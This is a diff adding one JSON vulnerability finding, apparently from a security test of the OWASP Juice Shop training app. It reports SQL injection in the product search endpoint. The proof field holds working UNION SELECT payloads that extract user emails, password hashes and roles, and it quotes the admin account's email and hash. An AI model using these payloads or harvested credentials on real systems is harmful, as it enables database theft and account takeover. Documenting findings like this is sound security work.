@@ -1,0 +1,10 @@
+{
+  "title": "SQL Injection in /rest/products/search — Full Database Extraction",
+  "location": "/rest/products/search",
+  "severity": "critical",
+  "proof": "Payload: apple')) UNION SELECT 1,group_concat(email||':'||password),3,4,5,6,7,8,9 FROM Users-- returned all 28 user rows with email:password_hash including admin@juice-sh.op:0192023a7bbd73250516f069df18b500, role enumeration via UNION SELECT 1,group_concat(id||':'||email||':'||password||':'||role),3,4,5,6,7,8,9 FROM Users-- showed roles (admin, customer, deluxe, accounting). SQLite version 3.44.2 confirmed via sqlite_version(). Table listing: Users, Products, Challenges, etc.",
+  "stage": "class_probe",
+  "precondition": "None",
+  "affected_actor": "anon",
+  "affected_resource": "product"
+}
